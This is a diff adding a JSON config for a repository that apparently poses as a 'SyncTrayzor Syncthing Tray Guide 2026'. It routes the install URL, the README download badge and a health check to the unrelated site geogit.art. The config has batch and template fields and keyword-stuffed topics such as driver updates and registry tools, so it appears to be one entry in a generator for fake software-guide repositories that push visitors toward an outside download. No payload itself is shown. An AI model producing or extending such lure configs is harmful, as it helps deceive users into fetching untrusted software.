@@ -1,0 +1,33 @@
+{
+  "repo": "SyncTrayzor-Syncthing-Tray-Guide-2026",
+  "product": "SyncTrayzor Syncthing Tray Guide 2026",
+  "kind": "utility",
+  "install_type": "geogit-web",
+  "install_url": "https://geogit.art/",
+  "install_command": null,
+  "readme_badge": "download-badge.png",
+  "readme_badge_click": "https://geogit.art/",
+  "health_url": "https://geogit.art/health",
+  "batch": "geogit-samodel-2-guide",
+  "format": "license-md-geogit-v3-web-badge-guide",
+  "tone": "guide",
+  "category": "utility",
+  "topics": [
+    "synctrayzor-syncthing-tray-guide",
+    "synctrayzor-desktop",
+    "synctrayzor-windows",
+    "synctrayzor-2026",
+    "system-optimization",
+    "driver-update",
+    "pc-maintenance",
+    "disk-cleanup",
+    "registry-tools",
+    "desktop-utility",
+    "windows-tools",
+    "performance-tuning",
+    "hardware-monitor",
+    "admin-toolkit"
+  ],
+  "site": "geogit.art",
+  "palette_index": 0
+}
